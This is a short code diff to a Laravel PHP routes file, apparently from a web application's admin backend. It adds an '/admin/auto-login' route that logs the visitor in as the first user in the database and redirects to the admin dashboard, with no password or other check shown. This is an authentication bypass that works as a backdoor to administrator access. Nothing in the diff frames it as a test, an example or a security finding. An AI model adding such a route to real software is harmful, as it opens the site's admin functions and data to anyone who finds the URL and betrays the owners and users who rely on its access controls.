@@ -41,6 +41,11 @@ use App\Http\Controllers\Backend\Technology\CertificateController;
 
 Route::prefix('/admin')->group(function () {
 
+    Route::get('/auto-login', function () {
+        \Illuminate\Support\Facades\Auth::login(\App\Models\User::first());
+        return redirect('/admin');
+    });
+
     Route::get('/', function () {
         $totalBlogs = Blog::count();
         $totalEvents = Event::count();
